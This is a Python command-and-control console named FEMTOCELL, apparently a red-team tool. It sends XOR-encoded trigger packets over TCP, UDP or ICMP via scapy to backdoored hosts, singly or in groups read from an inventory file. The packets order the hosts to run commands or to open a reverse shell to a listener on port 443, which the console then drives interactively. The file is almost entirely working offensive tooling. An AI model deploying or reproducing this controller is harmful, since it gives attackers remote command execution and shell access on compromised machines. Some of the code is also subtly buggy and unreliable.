from pydoc import plain
import scapy.all as scapy
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from termcolor import colored
import os
import confuse
import socket, sys, time
import threading

parsedConfig = {}

baseparams = {
    "MODE":"",
    "FILE":"",
}

cmdparams = {
    "RHOST": "",
    "RPORT": 445,
    "LHOST": "",
    "SPORT": 6006,
    "COMMAND": "whoami",
    "TRANSPORT": "TCP"
}

shellparams = {
    "RHOST": "",
    "RPORT": 445,
    "LHOST": "",
    "LPORT": 443,
    "SPORT": 6006,
    "TRANSPORT": "TCP"
}

groupparams = {
    "GROUP": "",
    "RHOST": "",
    "RPORT": 445,
    "LHOST": "",
    "SPORT": 6006,
    "COMMAND": "whoami",
    "TRANSPORT": "TCP"
}


def listen():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((shellparams['LHOST'], shellparams['LPORT']))
    s.listen(1)
    conn, addr = s.accept()
    print(colored(f"[+] Shell received from: {addr}\n\n","green"))
    first = True
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024 * 128).decode()
        sys.stdout.write(ans)
        if first:
            command = "\r"
            first = False
        else:
            command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(0.25)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
        if command == "exit\n":
            break

    s.close()

def validGroupKey():
    key = groupparams["GROUP"]

    try:
        parsedConfig[key]
    except KeyError:
        print(colored(f"[!] GROUP {key} does not exist. Setting GROUP value back to blank.\n", "red"))
        groupparams["GROUP"] = ""
        return False
    
    return True

def getGroup():
    key = groupparams["GROUP"]
    loi = []

    if parsedConfig[key] == 'hosts':
        loi.append(parsedConfig[key+':hosts'])
    elif parsedConfig[key] == 'children':
        subgroups = parsedConfig[key+':children']
        for item in subgroups:
            loi.append(parsedConfig[item+':hosts'])

    return loi

def importConfig(op_1):
    config = confuse.Configuration('t', __name__)
    config.set_file(op_1)
    configItems = config['all']['children'].get()
    for x in configItems:
        parsedConfig[x] = "x"
        if configItems[x].get('hosts'):
            parsedConfig[x] = "hosts"
            hostlist = []
            var = list(configItems[x].get('hosts').keys())[0]
            lIdx = var.find('[')
            rIdx = var.find(']')
            mIdx = var.find(':')
            lVal = var[lIdx+1:mIdx]
            rVal = var[mIdx+1:rIdx]
            for i in range(int(lVal), int(rVal)+1):
                lHalf = var[0:lIdx]
                rHalf = var[rIdx+1:len(var)]
                hostlist.append(lHalf + str(i) + rHalf)
            parsedConfig[x+":hosts"] = hostlist 
        elif configItems[x].get('children'):
            parsedConfig[x] = "children"
            parsedConfig[x+":children"] = list(configItems[x].get('children'))

    baseparams["FILE"] = op_1
    print(colored(f"[+] Config {op_1} loaded.\n", "blue"))


def print_groups():
    key = groupparams["GROUP"]

    if not validGroupKey():
        return

    if parsedConfig[key] == 'hosts':
        print(key)
        print(parsedConfig[key+':hosts'])
    elif parsedConfig[key] == 'children':
        subgroups = parsedConfig[key+':children']
        for item in subgroups:
            print(item)
            print(parsedConfig[item+":hosts"])


def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b''
    for b in byte_msg:
        # print(byte_msg, byte_key, b)
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte


def print_help(location):
    if location == "sub":
        print(colored("\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] REQUIRED: execute\n", "yellow"))
    else:
        print(colored("\n[?] REQUIRED: set mode <shell/cmd/group>\n[?] EXIT: exit\n[?] INFO: options\n[?] OPTIONAL: load <file.yml> (REQUIRED for GROUP mode)\n[?] REQUIRED: ready\n", "yellow"))


def print_options(p):
    for item in p.keys():
        if baseparams["MODE"] == "GROUP" and item == "RHOST":
            continue
        print(colored(f"{item}: {p[item]}", "blue"))
    print()


def main():
    print("""
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & jake

    """)

    if not os.path.exists("./history"):
        os.system("mkdir history")

    while(True):
        user_in = prompt(u'FEMTOCELL // ',
                        history=FileHistory('history/main.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        ).split()
        # click.echo_via_pager(user_input)

        if(len(user_in) == 3):
            user_cmd = user_in[0].upper()
            op_1 = user_in[1].upper()
            op_2 = user_in[2].upper()

            if(user_cmd == "SET"):
                baseparams[op_1] = op_2
                if op_1 == "MODE":
                    if baseparams["MODE"] == "SHELL" or baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
                        pass
                    else:
                        print(colored(f"[!] MODE {op_2} does not exist. Setting MODE value back to blank.\n", "red"))
                        baseparams["MODE"] = ""
                        continue
                    print(colored(f"[*] Mode {op_2} set.\n", "blue"))
        elif len(user_in) == 2:
            user_cmd = user_in[0]
            op_1 = user_in[1]
            if (user_cmd == "load"):
                if os.path.exists(op_1):
                    importConfig(op_1)
                else:
                    print(colored(f"[!] File {op_1} doesn't exist.\n", "red"))
                    continue
            else:
                print_help("base")

        elif len(user_in) == 1:
            user_cmd = user_in[0].upper()

            if user_cmd == "EXIT":
                exit()
            elif user_cmd == "HELP":
                print_help("base")
            elif user_cmd == "OPTIONS":
                print_options(baseparams)
            elif user_cmd == "READY":
                if baseparams["MODE"] == "SHELL":
                    ready(shellparams)
                elif baseparams["MODE"] == "CMD":
                    ready(cmdparams)
                elif baseparams["MODE"] == "GROUP":
                    if len(parsedConfig) == 0:
                        print(colored('[!] No config loaded.\n', "red"))
                        continue     
                    ready(groupparams)
                else:
                    print(colored("[!] No mode set.\n", "red"))
                    print_options(baseparams)
            else:
                print_help("base")
        elif len(user_in) == 0:
            continue
        else:
            print_help("base")


def ready(params):
    while True:
        user_in = prompt(f'FEMTOCELL // {baseparams["MODE"]} // ',
                        history=FileHistory('history/interact.history'),
                        auto_suggest=AutoSuggestFromHistory(),
                        ).split()

        if len(user_in) == 1:
            user_cmd = user_in[0].upper()

            if user_cmd == "BACK" or user_cmd == "EXIT":
                return
            elif user_cmd == "OPTIONS":
                print_options(params)
            elif user_cmd == "HELP":
                print_help("sub")
            elif baseparams["MODE"] == "GROUP" and user_cmd == "TARGETS":
                if params["GROUP"] == "":
                    print("no group set")
                    continue    
                print_groups()
            elif user_cmd == "EXECUTE":
                if baseparams["MODE"] == "CMD" and verify(cmdparams):
                    plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                    print(plaintext)
                    execute(plaintext, cmdparams)
                elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                    plaintext = "FC-SH-{}\00".format(params["LHOST"]) 
                    execute(plaintext, shellparams)
                elif baseparams["MODE"] == "GROUP" and verify(groupparams):
                    plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                    if parsedConfig.get(groupparams.get("GROUP")) == "":
                        print("group not valid")
                        continue
                    groupList = getGroup()
                    for iplist in groupList:
                        for ip in iplist:
                            groupparams["RHOST"] = ip
                            execute(plaintext, groupparams)
                else:
                    print_help("sub")
                    continue
            else:
                print_help("sub")
                continue
        elif len(user_in) == 3:
            user_cmd = user_in[0].upper()
            op_1 = user_in[1].upper()
            op_2 = user_in[2].upper()

            if user_cmd == "SET":
                if op_1 in params.keys():
                    if op_1 == "COMMAND" or op_1 == "GROUP":
                        op_2 = op_2.lower()
                    params[op_1] = op_2
                    print_options(params)
                else:
                    print_help("sub")
            else:
                print_help("sub")
        elif len(user_in) > 3:
            user_cmd = user_in[0].upper()
            op_1 = user_in[1].upper()

            if user_cmd == "SET":
                if op_1 == "COMMAND":
                    op_2 = ""
                    for i in range(2, len(user_in)):
                        op_2 = op_2 + user_in[i] + " "
                params[op_1] = op_2.strip(' ')
                print_options(params)
            else:
                print_help("sub")
        elif len(user_in) == 0:
            continue
        else:
            print_help("sub")



def verify(params):
    passing = False

    if params["TRANSPORT"] == "TCP" or params["TRANSPORT"] == "UDP" or params["TRANSPORT"] == "ICMP":
        passing = True
    else:
        print(colored('[!] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n', 'red'))
        params["TRANSPORT"] == "TCP"

    if baseparams["MODE"] != "GROUP" and params["RHOST"] == "": # blank or is invalid ip
        print(colored('[!] RHOST required.\n', 'red'))
        passing = False

    if params["LHOST"] == "": # blank or is invalid ip
        print(colored('[!] LHOST required.\n', 'red'))
        passing = False

    if baseparams["MODE"] == "GROUP" and not validGroupKey():
        passing = False

    return passing


def execute(plaintext, params):
    encrypted = xor_encrypt(plaintext.encode(), 0x10)

    if baseparams["MODE"] == "SHELL":
        t = threading.Thread(target=listen, args=())
        t.start()

    if(params["TRANSPORT"] == "UDP"):
        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
        scapy.UDP(sport=params["SPORT"], dport=params["RPORT"])/
        encrypted, verbose=False)
    elif(params["TRANSPORT"] == "TCP"):
        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
        scapy.TCP(sport=params["SPORT"], dport=params["RPORT"], flags="AP")/
        encrypted, verbose=False)
    elif(params["TRANSPORT"] == "ICMP"):
        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
        scapy.ICMP(code=1, type=8)/
        encrypted, verbose=False)

    RHOST = params["RHOST"]
    print(colored(f"[*] Sending {plaintext[6:]} --> {RHOST}\n", "green"))

    t.join()
    print(colored("\n[*] Shell closed.\n", "blue"))

if(__name__ == "__main__"):
    main()
